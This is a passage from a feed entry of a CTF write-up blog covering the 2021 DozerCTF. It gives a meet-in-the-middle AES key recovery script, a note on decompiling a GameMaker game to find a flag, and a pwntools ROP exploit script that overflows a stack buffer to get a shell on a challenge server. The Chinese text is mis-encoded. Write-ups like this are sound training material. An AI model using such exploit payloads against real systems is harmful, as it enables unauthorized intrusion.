aes.decrypt(msg)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line">    </span><br><span class="line">mid = <span class="built_in">dict</span>()</span><br><span class="line"><span class="keyword">for</span> s11 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s12 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s13 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s14 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">s1 = [<span class="number">7</span>, s11, s12, s13, s14]</span><br><span class="line">part1 = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : <span class="string">&#x27;&#123;:&gt;04&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">bin</span>(x)[<span class="number">2</span>:]), s1)) * <span class="number">16</span></span><br><span class="line">m = half_enc(pad(fl4g), part1).<span class="built_in">hex</span>()</span><br><span class="line">mid.update(&#123;m: s1&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(mid))</span><br><span class="line"><span class="keyword">for</span> s22 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s23 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s24 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s25 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">s2 = [s22, s23, s24, s25, <span class="number">8</span>]</span><br><span class="line">part2 = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : <span class="string">&#x27;&#123;:&gt;04&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">bin</span>(x)[<span class="number">2</span>:]), s2)) * <span class="number">16</span></span><br><span class="line">m = half_dec(<span class="built_in">bytes</span>.fromhex(fl4g_enc), part2).<span class="built_in">hex</span>()</span><br><span class="line"><span class="keyword">if</span> m <span class="keyword">in</span> mid:</span><br><span class="line">s1 = mid[m]</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"><span class="built_in">print</span>(s2)</span><br><span class="line">                    </span><br><span class="line"><span class="comment">#s1 = [7, 15, 9, 11, 15]</span></span><br><span class="line"><span class="comment">#s2 = [8, 4, 13, 15, 8]</span></span><br><span class="line"><span class="comment">#secret = 78ff9db4f8</span></span><br><span class="line"></span><br><span class="line">secret = <span class="string">&#x27;78ff9db4f8&#x27;</span></span><br><span class="line">ex = extend(secret)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encrypt(pad(fl4g)).<span class="built_in">hex</span>() == fl4g_enc)</span><br><span class="line"><span class="built_in">print</span>(decrypt(<span class="built_in">bytes</span>.fromhex(fl4g_enc)) == pad(fl4g))</span><br><span class="line"><span class="built_in">print</span>(decrypt(<span class="built_in">bytes</span>.fromhex(flag_enc)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;Dozerctf&#123;thanks_to_Seniors_and_Sisters&#125;\x11\x11\x11\x11\x11\x11\x11\x11\x11&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="i-wanna-å¤§æ™šä¸Šç‰¹ä¾›ç‰ˆ"><a href="#i-wanna-å¤§æ™šä¸Šç‰¹ä¾›ç‰ˆ" class="headerlink" title="i wanna å¤§æ™šä¸Šç‰¹ä¾›ç‰ˆ"></a>i wanna å¤§æ™šä¸Šç‰¹ä¾›ç‰ˆ</h3><blockquote><p>æ™šä¸ŠåŸŸæ¸—é€ç¯å¢ƒè¿˜æ˜¯è€æ˜¯å´©ï¼Œæ²¡äº‹å„¿æ¥ä¸ªi wanna æ³„æ³„ç«ï¼Œç©å°±æ˜¯äº† é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/14aBNQg90jLDEOOLWhkqrNQ">https://pan.baidu.com/s/14aBNQg90jLDEOOLWhkqrNQ</a> æå–ç ï¼š4s8s</p></blockquote><p>GameMakerå¼€å‘çš„è‘—åI Wannaç³»åˆ—å°æ¸¸æˆã€‚</p><p>ç”¨ <a href="https://github.com/OpenGMK/GM8Decompiler">GM8Decompiler</a> æŠŠexeæ¢å¤ä¸ºgmkæ–‡ä»¶ï¼Œå†ç”¨ <a href="https://github.com/Medo42/Gmk-Splitter">Gmk-Splitter</a> æå–gmkæ–‡ä»¶ä¸­æ¸¸æˆç´ æï¼Œåœ¨å›¾ç‰‡å †é‡Œæ‰¾åˆ°åŒ…å«flagçš„ä¸€å¼ å›¾ç‰‡ã€‚</p><p>â€‹    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="PwnPwnPwn"><a href="#PwnPwnPwn" class="headerlink" title="PwnPwnPwn"></a>PwnPwnPwn</h3><blockquote><p>è²Œä¼¼åˆæ˜¯åŸé¢˜ï¼Œé”¤çˆ†è¿™ä¸ªå‡ºé¢˜äºº nc 1.14.160.21 20001</p></blockquote><p>ç®€å•ret2text64ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;1.14.160.21&#x27;</span>, <span class="number">20001</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x401176</span></span><br><span class="line">binsh1 = <span class="number">0x401199</span></span><br><span class="line">binsh2 = <span class="number">0x4011f9</span></span><br><span class="line">p_rdi = <span class="number">0x401313</span></span><br><span class="line">p_rsi_r15 = <span class="number">0x401311</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x78</span> + p64(p_rdi) + p64(<span class="number">0xB16BAD</span>) + p64(binsh1) + p64(p_rsi_r15) + p64(<span class="number">0xFEE1DEAD</span>) + p64(<span class="number">0</span>) + p64(p_rdi) + p64(<span class="number">0xBADF00D</span>)  + p64(binsh2) + p64(backdoor)</span><br><span class="line">r.sendline(pay)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ¯”èµ›æ—¶é—´ï¼š2021å¹´5æœˆ29æ—¥ 9:00-2021å¹´5æœˆ30æ—¥æ™š21:30&lt;br&gt;æ¯”èµ›å¹³å°ï¼š&lt;a href=&quot;http://1.14.160.21:8000/&quot;&gt;http://1.14.160.21:8000/&lt;/a&gt;&lt;/</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021èµ›" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
</feed>
